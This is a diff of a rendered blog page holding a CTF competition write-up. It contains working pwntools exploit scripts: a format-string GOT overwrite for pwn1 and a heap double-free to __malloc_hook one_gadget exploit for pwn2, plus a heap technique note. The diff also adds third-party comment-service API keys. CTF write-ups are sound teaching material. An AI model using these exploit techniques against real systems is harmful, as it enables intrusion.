@@ -142,18 +142,6 @@
         </div>
         <div class="bottom">
           <div class="follow">
-            
-            <a href="https://github.com/shixiaohu2206" target="_block">
-              <span class="iconfont icon-github"></span>
-            </a>
-            
-            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
-              <span class="iconfont icon-facebook"></span>
-            </a>
-            
-            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
-              <span class="iconfont icon-instagram"></span>
-            </a>
              
             <a href="/atom.xml" target="_block">
               <span class="iconfont icon-rss"></span>
@@ -175,6 +163,11 @@
           <span>2019/11/03</span>
         </span>
 
+        
+          <span class="item leancloud-visitors" id="/2019/11/03/山东深思杯write-up/" data-flag-title="山东深思杯write up">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
         
 
          
@@ -208,9 +201,84 @@
     </div>
     <h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="FuQiang">FuQiang<a class="post-anchor" href="#FuQiang"></a></h2><p>程序</p>
 <h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="pwn1">pwn1<a class="post-anchor" href="#pwn1"></a></h2><p>题目给了一个backdoor ，满足约束条件即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./pwn_MinZhu"</span>)</span><br><span class="line"><span class="comment">#p =remote("172.29.1.38", 9999)</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn_MinZhu"</span>)</span><br><span class="line">system = <span class="number">0x08048696</span></span><br><span class="line">plt = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p.sendlineafter(<span class="string">"Key:"</span>,<span class="string">"xNd9y6"</span>)</span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your msg:"</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804A064</span>:<span class="number">0x3</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804A060</span>:<span class="number">8217</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;plt:<span class="number">0x8048696</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SHBYTE = 57 9</span></span><br><span class="line"><span class="string">SHBYTE1 = 78 N</span></span><br><span class="line"><span class="string">SHBYTE2 = 100 d</span></span><br><span class="line"><span class="string">CHAR S = 120 x</span></span><br><span class="line"><span class="string">v4 =6</span></span><br><span class="line"><span class="string">v3 = y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xNd9y6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level=<span class="hljs-string">'debug'</span>
+p = process(<span class="hljs-string">"./pwn_MinZhu"</span>)
+<span class="hljs-comment">#p =remote("172.29.1.38", 9999)</span>
+elf = ELF(<span class="hljs-string">"./pwn_MinZhu"</span>)
+system = <span class="hljs-number">0x08048696</span>
+plt = elf.got[<span class="hljs-string">'puts'</span>]
+p.sendlineafter(<span class="hljs-string">"Key:"</span>,<span class="hljs-string">"xNd9y6"</span>)
+offset = <span class="hljs-number">4</span>
 
-<h2 id="pwn2">pwn2<a class="post-anchor" href="#pwn2"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">"-h"</span>]</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"\nInput the length of data:"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Leave your message:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter what you want to modify:\n"</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">""</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">""</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">"aaaaaaa"</span>) <span class="comment">#3</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Sticky note:aaaaaaa\n"</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">"libc_base : 0x%x"</span>%libc_base)</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">"malloc_hook:0x%x"</span>%malloc_hook)</span><br><span class="line">log.success(<span class="string">"one_gadget:0x%x"</span>%(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"\nInput the length of data:"</span>,str(<span class="number">127</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+p.recvuntil(<span class="hljs-string">"your msg:"</span>)
+payload=fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A064</span>:<span class="hljs-number">0x3</span>&#125;)
+p.sendline(payload)
+
+payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A060</span>:<span class="hljs-number">8217</span>&#125;)
+p.sendline(payload)
+payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;plt:<span class="hljs-number">0x8048696</span>&#125;)
+
+p.sendline(payload)
+<span class="hljs-string">'''
+SHBYTE = 57 9
+SHBYTE1 = 78 N
+SHBYTE2 = 100 d
+CHAR S = 120 x
+v4 =6
+v3 = y
+
+xNd9y6
+'''</span>
+p.interactive()</code></pre>
+
+<h2 id="pwn2">pwn2<a class="post-anchor" href="#pwn2"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#context.log_level='debug'</span>
+context.terminal=[<span class="hljs-string">"tmux"</span>,<span class="hljs-string">"split"</span>,<span class="hljs-string">"-h"</span>]
+p = process(<span class="hljs-string">"./pwn"</span>)
+libc = ELF(<span class="hljs-string">"./libc.so"</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))
+	p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(size))
+	p.sendlineafter(<span class="hljs-string">"Leave your message:\n"</span>,content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">2</span>))
+	p.sendlineafter(<span class="hljs-string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">3</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">4</span>))
+	p.sendlineafter(<span class="hljs-string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))
+	p.sendlineafter(<span class="hljs-string">"Enter what you want to modify:\n"</span>,content)
+
+add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#1</span>
+add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#2</span>
+delete(<span class="hljs-number">1</span>)
+add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">"aaaaaaa"</span>) <span class="hljs-comment">#3</span>
+show()
+p.recvuntil(<span class="hljs-string">"Sticky note:aaaaaaa\n"</span>)
+libc_base = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-0x3c4b78</span>
+log.success(<span class="hljs-string">"libc_base : 0x%x"</span>%libc_base)
+malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]
+log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)
+log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))
+add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
+add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
+delete(<span class="hljs-number">4</span>)
+delete(<span class="hljs-number">5</span>)
+delete(<span class="hljs-number">4</span>)
+add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))
+add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
+add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
+add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))
+p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))
+p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(<span class="hljs-number">127</span>))
+<span class="hljs-comment">#gdb.attach(p)</span>
+p.interactive()</code></pre>
 
 <h2 id="pwn3">pwn3<a class="post-anchor" href="#pwn3"></a></h2><p>利用 malloc_consolidate 去完成 chunk 的重叠，从而实现leak libc跟 tcache 的uaf（通过刻意的让 unsorted chunk 的size变小，可以让 unsorted chunk 的下一个chunk的prev_size 不变，从而可以 pass malloc_consolidate 时的 unlink 检测，从而实现chunk的重</p>
 
@@ -282,7 +350,7 @@
   
 </html>
 <script type="text/javascript">
-                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"vVaPNFdcK9dSGbIzRRK8Lynz-gzGzoHsz\",\"API_KEY\":\"dPlqFhVLg4CTqpRKmq7I0cQw\"},\"service_worker\":{\"open\":false}}")
                 </script> <script type="text/javascript">window.addEventListener('load', function() {
     
     window.loadJs = function(d, m, a) {
